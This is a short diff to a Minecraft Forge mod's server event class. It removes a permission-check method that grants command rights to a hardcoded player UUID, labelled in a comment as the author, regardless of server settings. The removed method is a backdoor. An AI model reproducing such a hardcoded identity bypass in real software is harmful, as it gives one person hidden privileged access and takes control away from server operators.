@@ -18,24 +18,6 @@ public class ForgeServerEvents {
 
     private static final ResourceLocation KILL_DRAGON_ADVANCEMENT = ResourceLocation.withDefaultNamespace("end/kill_dragon");
 
-    public static boolean permission(CommandSourceStack sourceStack, int permissionLevel)
-    {
-        boolean ret = false;
-
-        if (sourceStack.getEntity() instanceof Player player) // Is the executor a player?
-        {
-            if (player.getStringUUID().equals("7c20841e-1d63-4dd7-a60b-2afb2f65777a")) // Are they LaserDiamond52?
-            {
-                ret = true;
-            }
-        }
-        if (sourceStack.hasPermission(permissionLevel)) // Otherwise, does the player have permission?
-        {
-            ret = true;
-        }
-        return ret;
-    }
-
     @SubscribeEvent
     public static void onAdvancementEarned(AdvancementEvent.AdvancementEarnEvent event)
     {
